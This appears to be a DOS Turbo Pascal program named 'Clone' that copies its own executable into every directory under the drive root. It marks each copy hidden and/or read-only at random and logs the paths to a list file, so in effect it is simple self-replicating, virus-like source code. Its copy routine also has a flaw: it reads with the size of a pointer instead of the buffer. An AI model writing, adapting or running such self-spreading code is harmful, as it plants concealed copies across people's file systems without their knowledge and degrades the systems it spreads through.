PROGRAM Clone;

USES Crt,Dos;

CONST
  RetryTime=10;
  FileBufferSize=32768;

VAR
  a,b          : Byte;
  r,q,FileName : string;

  Counter,FileAttr2:word;
  FileHandle:file;


  Path     : PathStr;
  Dir      : DirStr;
  Name     : NameStr;
  Ext      : ExtStr;
  FullName : PathStr;
  F        : SearchRec;
  Ch       : Char;
  I        : Integer;

  listfile : Text;

function SetFileAttributes(FileName:string;FileAttr:word):boolean;
begin
  Assign(FileHandle,FileName);
  SetFAttr(FileHandle,FileAttr);

  SetFileAttributes:=((IOResult=0) and (DosError=0));
end;

function GetFileAttributes(FileName:string;var FileAttr:word):boolean;
begin
  Assign(FileHandle,FileName);
  GetFAttr(FileHandle,FileAttr);

  GetFileAttributes:=((IOResult=0) and (DosError=0));
end;


function CopyFile(InputFileName,OutputFileName:string):boolean;
var
  InputFile,OutputFile:file;
  ReadStatus,WriteStatus:word;
  FileBuffer:pointer;
  FileDateTime:longint;

begin
  CopyFile:=False;

  Assign(InputFile,InputFileName);
  Reset(InputFile,1);

  GetFileAttributes(OutputFileName,FileAttr2);
  SetFileAttributes(OutputFileName,0);

  Assign(OutputFile,OutputFileName);
  Rewrite(OutputFile,1);

  if IOResult<>0 then
    Exit;
  if MaxAvail<FileBufferSize then
    Exit;

  GetMem(FileBuffer,FileBufferSize);

  repeat
    BlockRead(InputFile,FileBuffer^,SizeOf(FileBuffer),ReadStatus);
    BlockWrite(OutputFile,FileBuffer^,ReadStatus,WriteStatus);
  until (ReadStatus=0) or (WriteStatus<>ReadStatus);

  FreeMem(FileBuffer,FileBufferSize);

  GetFTime(InputFile,FileDateTime);
  SetFTime(OutputFile,FileDateTime);

  Close(InputFile);
  Close(OutputFile);

  SetFileAttributes(OutputFileName,FileAttr2);
  FileAttr2 := 0;

  IF Random(2) = 0 THEN FileAttr2 := FileAttr2 + ReadOnly;
  IF Random(2) = 0 THEN FileAttr2 := FileAttr2 + Hidden;
  Writeln(FileAttr2);

  SetFileAttributes(OutputFileName,FileAttr2);

  CopyFile:=True;
end;

PROCEDURE GetFileName;
BEGIN
  q := '';
  r := ParamStr(0);
  a := 0;
  b := Length(ParamStr(0));
  REPEAT
    Inc(a);
    q := q+r[b];
    Dec(b);
  UNTIL r[b] = '\';
  b := Length(q);
  r := q;
  FOR i := 1 TO b DO BEGIN
    q[(b+1)-i] := r[i];
  END;
  FileName := q;
END;

Procedure Process(dir : DirStr; s : SearchRec);
begin
  Writeln(dir, s.name);
  Assign(listfile,'root.lst');
  Append(listfile);
  WriteLn(listfile,dir,s.name);
  getfilename;

  r := dir+s.name+'\'+Filename;

  CopyFile(Paramstr(0),r);
  Close(listfile);
end;

Procedure SearchDir(Path : PathStr; fspec : String);
Var
  f : SearchRec;
begin
  Findfirst(Path+fspec, Directory, f);
  While DosError = 0 do
  begin
    IF (f.Attr AND Directory = Directory) THEN BEGIN
      Process(path, f);
      {WriteLn(listfile,path+f.name);
      CopyFile(paramstr(0),path+'clone.exe');}
      WriteLn('datei kopiert!');
    END;
    Findnext(f);
  end;
end;

BEGIN
  Randomize;
  ClrScr;
  Assign(listfile,'root.lst');
  Rewrite(listfile);
  Close(listfile);
  SearchDir('\','*.*');
  writeLn(paramstr(0));
  ReadKey;
END.
